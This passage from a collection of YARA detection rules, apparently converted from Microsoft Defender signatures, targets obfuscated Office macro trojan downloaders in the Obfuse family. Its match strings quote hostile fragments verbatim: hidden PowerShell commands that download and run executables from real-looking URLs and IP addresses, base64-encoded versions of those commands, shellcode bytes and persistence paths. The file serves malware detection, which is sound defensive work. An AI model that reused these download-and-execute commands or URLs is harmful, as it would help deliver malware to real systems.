        $x_1_5 = "Environ(\"USERPROFILE\") & \"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NetLogger.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JO_2147742444_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JO!MTB"
        threat_id = "2147742444"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 [0-10] 2c 20 [0-10] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "@:@\\@h@f@r@e@f@\\@c@h@o@y@v@p@\\@v@a@.@u@g@z@y@" ascii //weight: 1
        $x_1_3 = "@:@\\@j@v@a@q@b@j@f@\\@f@l@f@g@r@z@3@2@\\@z@f@u@g@n@.@r@k@r@" ascii //weight: 1
        $x_1_4 = "@:@\\@h@f@r@e@f@\\@c@h@o@y@v@p@\\@v@a@.@p@b@z@" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JO_2147742444_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JO!MTB"
        threat_id = "2147742444"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(\"temp\")" ascii //weight: 1
        $x_1_2 = "= New WshShell" ascii //weight: 1
        $x_1_3 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-16] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 70 65 6e 20 [0-16] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_5 = "ActiveDocument.Bookmarks" ascii //weight: 1
        $x_1_6 = "ActiveDocument.AcceptAllRevisionsShown" ascii //weight: 1
        $x_1_7 = ".ShowHidden = False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JO_2147742444_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JO!MTB"
        threat_id = "2147742444"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {56 42 41 2e 4d 69 64 28 [0-10] 2c 20 [0-10] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = {56 42 41 2e 43 68 72 28 [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 28 [0-10] 2c 20 [0-10] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "As String = \"p@:@\\@j@v@a@q@b@j@f@\\@f@l@f@g@r@z@3@2@\\@z@f@u@g@n@.@r@k@r@" ascii //weight: 1
        $x_1_5 = "As String = \"P@:@\\@h@f@r@e@f@\\@c@h@o@y@v@p@\\@v@a@.@p@b@z@" ascii //weight: 1
        $x_1_6 = "As String = \"P@:@\\@h@f@r@e@f@\\@c@h@o@y@v@p@\\@v@a@.@u@g@z@y@" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JO_2147742444_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JO!MTB"
        threat_id = "2147742444"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 3a 7b 31 33 37 30 22 20 26 20 [0-8] 20 26 20 22 39 36 32 22 20 26 20 [0-8] 20 26 20 22 30 2d 43 32 37 22 20 26 20 [0-8] 20 26 20 22 39 2d 31 31 43 22 20 26 20 [0-8] 20 26 20 22 45 2d 41 34 22 20 26 20 [0-8] 20 26 20 22 39 45 2d 34 34 34 35 22 20 26 20 [0-8] 20 26 20 22 35 33 35 34 22 20 26 20 [0-8] 20 26 20 22 30 30 30 30}  //weight: 1, accuracy: Low
        $x_1_2 = {4e 6f 2e 4e 61 6d 65 73 70 61 63 65 28 22 43 3a 5c 77 69 6e 64 6f 22 20 26 20 [0-8] 20 26 20 22 77 73 5c 74 65 22 20 26 20 [0-8] 20 26 20 22 6d 70 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 6f 70 79 48 65 72 65 20 28 22 5c 5c 74 68 65 61 74 74 61 22 20 26 20 [0-8] 20 26 20 22 63 6b 65 72 2e 63 6f 6d 40 53 22 20 26 20 [0-8] 20 26 20 22 53 4c 5c 77 65 62 64 22 20 26 20 [0-8] 20 26 20 22 61 76 5f 73 5c [0-10] 2e 65 78 22 20 26 20 [0-8] 20 26 20 22 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JP_2147742446_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JP!MTB"
        threat_id = "2147742446"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-9] 20 2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-9] 2e 43 61 70 74 69 6f 6e 20 2b 20 [0-9] 29 2e 43 72 65 61 74 65 28 [0-52] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-9] 2e 43 61 70 74 69 6f 6e 20 2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74}  //weight: 1, accuracy: Low
        $x_1_3 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JQ_2147742447_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JQ!MTB"
        threat_id = "2147742447"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {3d 20 22 5c 54 65 6d 70 5c [0-21] 2e 6a 73 22}  //weight: 10, accuracy: Low
        $x_1_2 = "= Environ(d)" ascii //weight: 1
        $x_1_3 = {4f 70 65 6e 20 [0-21] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = ".Caption" ascii //weight: 1
        $x_1_5 = "\"Shell" ascii //weight: 1
        $x_1_6 = "& \".Application\")," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JQ_2147742447_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JQ!MTB"
        threat_id = "2147742447"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXEC(\"cmd /c po^wer^shell -w 1 (New-Object Net.WebClient).DownloadFile('https://tinyurl.com/y3psaqmm',($env:appdata + '\\re.exe'))\")V" ascii //weight: 1
        $x_1_2 = {45 58 45 43 28 22 63 6d 64 20 2f 63 20 70 6f 5e 77 65 72 5e 73 68 65 6c 6c 20 2d 77 20 31 20 53 74 61 72 74 2d 53 6c 65 65 70 20 31 32 3b 20 73 54 41 72 74 2d 60 50 60 52 60 6f 63 65 73 73 20 24 65 6e 76 3a 61 70 70 64 61 74 61 5c 72 65 2e 65 78 65 22 29 0a}  //weight: 1, accuracy: High
        $x_1_3 = "https://tinyurl.com/y3psaqmm',($env:appdata + '\\re.exe'))\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JR_2147742470_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JR!MTB"
        threat_id = "2147742470"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"S\" & \"h\" & \"e\" & \"l\" & \"l\"" ascii //weight: 1
        $x_1_2 = "= \"W\" & \"S\" & \"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii //weight: 1
        $x_1_3 = "= \"p\" & \"o\" & \"w\" & \"e\" & \"r\" & \"s\" & \"h\" & \"e\" & \"l\" & \"l\" & \".\" & \"e\" & \"x\" & \"e\" & \" \"" ascii //weight: 1
        $x_1_4 = "= VBA.CreateObject(" ascii //weight: 1
        $x_1_5 = ".Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JS_2147742475_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JS!MTB"
        threat_id = "2147742475"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://%20%20@j.mp/asdaxasdasxasdasdsddodkasodkaos" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JS_2147742475_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JS!MTB"
        threat_id = "2147742475"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {53 68 0b 00 00 65 6c 6c 45 78 65 63 75 74 65 41}  //weight: 1, accuracy: High
        $x_1_2 = {55 52 10 00 00 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: High
        $x_1_3 = {43 3a 5c 55 73 65 72 73 5c 1f 00 00 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e 67 5c 48 65 6c 6c 6f 57 6f 72 6c 64 2e 65 78 65}  //weight: 1, accuracy: High
        $x_1_4 = "http://93.115.19.226/evl.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JS_2147742475_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JS!MTB"
        threat_id = "2147742475"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 6f 62 6a 50 72 6f 63 65 73 73 2e 43 72 65 61 74 65 28 [0-53] 2c 20 4e 75 6c 6c 2c 20 6f 62 6a 43 6f 6e 66 69 67 2c 20 69 6e 74 50 72 6f 63 65 73 73 49 44 29}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 73 74 72 44 61 74 61 2c 20 [0-16] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".Get(SReverseMod(Hex2Str(\"" ascii //weight: 1
        $x_1_4 = "& StrReverse(Mid(Text," ascii //weight: 1
        $x_1_5 = "= 1 To Len(strData) Step 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JS_2147742475_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JS!MTB"
        threat_id = "2147742475"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"cmd /c\"" ascii //weight: 1
        $x_1_2 = "\"DownloadFile\"" ascii //weight: 1
        $x_1_3 = {68 65 6f 2e 70 65 61 72 6c 6e 77 61 6c 74 65 72 73 2e 75 73 2f [0-5] 2f [0-3] 2e 65 78 65 28 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_4 = {22 27 2c 27 25 74 65 6d 70 25 5c [0-5] 2e 65 78 65 27 29 3b 73 74 61 72 74 20 25 74 65 6d 70 25 5c 00 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_5 = "Get(\"Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_6 = "= GetObject(\"winmgmts:root\\cimv2:Win32_Process\")" ascii //weight: 1
        $x_1_7 = "obj.Document.Application.ShellExecute \"cmd.exe \", \"/c \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JT_2147742477_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JT!MTB"
        threat_id = "2147742477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 75 6e 20 [0-4] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 22 74 65 73 74 22 2c 20 22 74 65 73 74 22 2c 20 43 68 72 28 [0-6] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JT_2147742477_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JT!MTB"
        threat_id = "2147742477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://similarwebtool.ru/j98j23902dssdf234dfsdf.php" ascii //weight: 1
        $x_1_2 = "aHR0cHM6Ly9zaW1pbGFyd2VidG9vbC5ydS9qOThqMjM5MDJkc3NkZjIzNGRmc2RmLnBocA==" ascii //weight: 1
        $x_1_3 = "UserName\"\"\" & \":\"\"\" & Environ(\"Username\") & \"\"\"\" & \",\"\"Filename\"\":\" &" ascii //weight: 1
        $x_1_4 = "StrConv(bOut, vbUnicode)" ascii //weight: 1
        $x_1_5 = "(UBound(bIn) + 1) \\ 4) * 3) - 1" ascii //weight: 1
        $x_1_6 = "Mid(MyVal, i, 1)) & \",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JT_2147742477_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JT!MTB"
        threat_id = "2147742477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64" ascii //weight: 1
        $x_1_2 = "0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26" ascii //weight: 1
        $x_1_3 = "x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5" ascii //weight: 1
        $x_1_4 = "0xe8, 0x89, 0xfd, 0xff, 0xff, 0x61, 0x70, 0x70, 0x2e, 0x69, 0x63, 0x65, 0x66, 0x69, 0x6c, 0x65" ascii //weight: 1
        $x_1_5 = "windir & \"\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \" & Replace(ppath, \" \", \"\"\" \"\"\")" ascii //weight: 1
        $x_1_6 = "profile + \"\\Documents\\template.xml" ascii //weight: 1
        $x_1_7 = "Replace(Template, \"@\", \"\"\"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JU_2147742479_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JU!MTB"
        threat_id = "2147742479"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(\"USERPROFILE\")" ascii //weight: 1
        $x_1_2 = "\"userprofile\"" ascii //weight: 1
        $x_1_3 = "= New WshShell" ascii //weight: 1
        $x_1_4 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-16] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {4f 70 65 6e 20 [0-16] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_6 = "ActiveDocument.Bookmarks" ascii //weight: 1
        $x_1_7 = "ActiveDocument.AcceptAllRevisionsShown" ascii //weight: 1
        $x_1_8 = ".ShowHidden = False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JU_2147742479_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JU!MTB"
        threat_id = "2147742479"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "http://www.elit.com.mx/xls/lohlog.exe " ascii //weight: 2
        $x_2_2 = {7b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-10] 5c [0-10] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_2_3 = {68 74 74 70 3a 2f 2f 32 30 39 2e 31 34 31 2e 33 35 2e 32 33 39 2f 33 33 2f [0-15] 2e 6a 70 67}  //weight: 2, accuracy: Low
        $x_2_4 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 4d 75 73 69 63 5c [0-15] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_1_5 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass  -command " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JU_2147742479_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JU!MTB"
        threat_id = "2147742479"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass  -command " ascii //weight: 1
        $x_1_2 = "https://uae-signs.com/wp-includes/SimplePie/Content/project1/PROJRCT-B.exe -OutFile C:\\Users\\Public\\Documents\\jjsdulnvj.exe}; " ascii //weight: 1
        $x_1_3 = "{Start-Process -FilePath \"C:\\Users\\Public\\Documents\\jjsdulnvj.exe\"}" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JV_2147742483_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JV!MTB"
        threat_id = "2147742483"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAgLWNvbW1hbmQgIiAmIHsgaXdyIGh0dHA6Ly9vbmUueWl0eXR3by54eXovSEpYRU1VLmpwZyAtT3V0" ascii //weight: 1
        $x_1_2 = "RmlsZSBDOlxVc2Vyc1xQdWJsaWNcRG9jdW1lbnRzXGNyaXp4Znh0dC5leGV9OyAmIHtTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAiQzpcVXNlcnNcUHVibGljXERvY3VtZW50c1xjcml6eGZ4dHQuZXhlIn0i" ascii //weight: 1
        $x_1_3 = "d2lubWdtdHM6d2luMzJfUHJvY2Vzcw==" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JV_2147742483_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JV!MTB"
        threat_id = "2147742483"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 22 20 2b 20 22 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 57 69 6e 22 20 2b 20 22 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 22 20 2b 20 22 6d 67 6d 74 73 3a 57 69 6e 22 20 2b 20 22 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 22 20 2b 20 22 6d 67 6d 74 22 20 2b 20 22 73 3a 57 69 6e 22 20 2b 20 22 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 22 20 2b 20 22 57 69 6e 33 32 5f 50 72 6f 22 20 2b 20 22 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_7 = {2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-9] 2e 43 61 70 74 69 6f 6e 20 2b 20 [0-9] 29}  //weight: 1, accuracy: Low
        $x_1_8 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JW_2147742548_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JW!MTB"
        threat_id = "2147742548"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fun = fun1 + fun2 + fun3" ascii //weight: 1
        $x_1_2 = "Shell (fun)" ascii //weight: 1
        $x_1_3 = "third = (third + first(second) + fourth(second Mod Len(Password))) Mod 256" ascii //weight: 1
        $x_1_4 = "fourth(second) = fourth(second) Xor first(Temp + first((third + first(third)) Mod 254))" ascii //weight: 1
        $x_1_5 = "= StrConv(Password, vbFromUnicode)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JW_2147742548_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JW!MTB"
        threat_id = "2147742548"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5I" ascii //weight: 1
        $x_1_2 = "IGh0dHA6Ly8xOTIuMjM2LjE3OC44MC83ei9ERkwtMTU1OTAxLmpwZy" ascii //weight: 1
        $x_1_3 = "e1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJDOlxVc2Vyc1xQdWJsaWNccmxhcWlhbG5kLmV4ZSJ9Ig==" ascii //weight: 1
